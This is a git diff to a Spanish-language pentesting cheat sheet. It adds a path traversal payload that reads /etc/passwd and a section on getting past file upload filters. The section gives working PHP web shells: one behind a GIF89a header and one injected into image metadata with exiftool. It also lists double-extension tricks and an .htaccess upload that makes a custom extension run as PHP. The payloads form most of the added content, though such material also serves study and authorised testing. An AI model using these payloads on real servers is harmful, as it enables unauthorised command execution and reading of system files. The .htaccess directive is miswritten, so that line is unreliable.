@@ -42,6 +42,7 @@
        * [PHP Reverse Shell Manual Multifuncional](#php-reverse-shell-manual-multifuncional)       
        * [ASP/ASPX Reverse Shell](#asp-aspx-reverse-shell)
        * [NoTCPShell](#notcpshell) 
+       * [Bypass File Upload Filtering](#bypass-file-upload-filtering)
      * [Pentesting Linux](#pentesting-linux)
         * [Tratamiento de la TTY](#tratamiento-de-la-tty)
         * [Monitorizado de Procesos a Tiempo Real](#process-monitoring)
@@ -1487,6 +1488,10 @@ Así como incorporar un **%00** para el bypassing de restricciones implementadas
 
 `http://localhost/file.php?file=../../../../../etc/passwd%00`
 
+Otra forma también de bypassear posibles restricciones es añadiendo un interrogante al final de la petición:
+
+`http://localhost/file.php?file=../../../../../etc/passwd?`
+
 Por [aquí](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal) os dejo un buen recurso para el uso de Wrappers y otras técnicas de bypassing.
 
 #### LFI to RCE
@@ -1778,6 +1783,45 @@ De esta forma, el usuario que hace las consultas podría efectuar cualquiera de 
 * http://192.168.1.X/fichero.php?upload=script.php&fexec=php+script.php
 
 Para depositar archivos sobre el sistema aprovechando la variable '_fupload_', necesitaremos compartir un servidor con Python perviamente sobre el directorio cuyos recursos queramos depositar sobre el equipo remoto.
+
+#### Bypass File Upload Filtering
+
+Una de las técnicas típicas además del **Null Byte Injection** y las de **Content-Type**, es la de doble extensión. Esto es simplemente renombrar nuestro script php a _shell.php.jpg_. 
+
+Listo a continuación otros formatos aceptados en función del lenguaje que se utilice:
+
+**php** phtml, .php, .php3, .php4, .php5, and .inc
+**asp** asp, .aspx
+**perl** .pl, .pm, .cgi, .lib
+**jsp** .jsp, .jspx, .jsw, .jsv, and .jspf
+**Coldfusion** .cfm, .cfml, .cfc, .dbm
+
+En caso de analizar el **Content** en la subida de archivo, podemos bypassearla de la siguiente forma:
+
+```bash
+GIF89a;
+<?
+system($_GET['cmd']);
+?>
+```
+
+Otra vía alternativa es a través de imágenes, haciendo uso de **exiftool** para insertar metadatos. Para ello, sobre una imagen válida, aplicamos el siguiente comando:
+
+```bash
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' imagen.jpg
+```
+
+Posteriormente, es necesario renombar el archivo **imagen.jpg** a **imagen.php.jpg**. Una vez hecho, tras subir la imagen, podremos apuntar a ella jugando con la variable **cmd** posteriormente para ejecutar comandos en remoto sobre el sistema desde la URL.
+
+Otra técnica bastante chula, consiste en subir un archivo **.htaccess**. En caso de existir en el directorio de subida, la idea es poder sobreescribir su contenido. En caso de no existir, es simplemente rezar y esperar que no exista otro en un directorio padre.
+
+Nuestro archivo **.htaccess**, tendría el siguiente contenido:
+
+```bash
+Add-Type Application/x-httpd-php .miextension
+```
+
+De subirlo y alojarlo en el servidor, posteriormente si subimos un archivo de extensión **.miextension**, será interpretado como un archivo PHP.
 
 ### Pentesting Linux
 
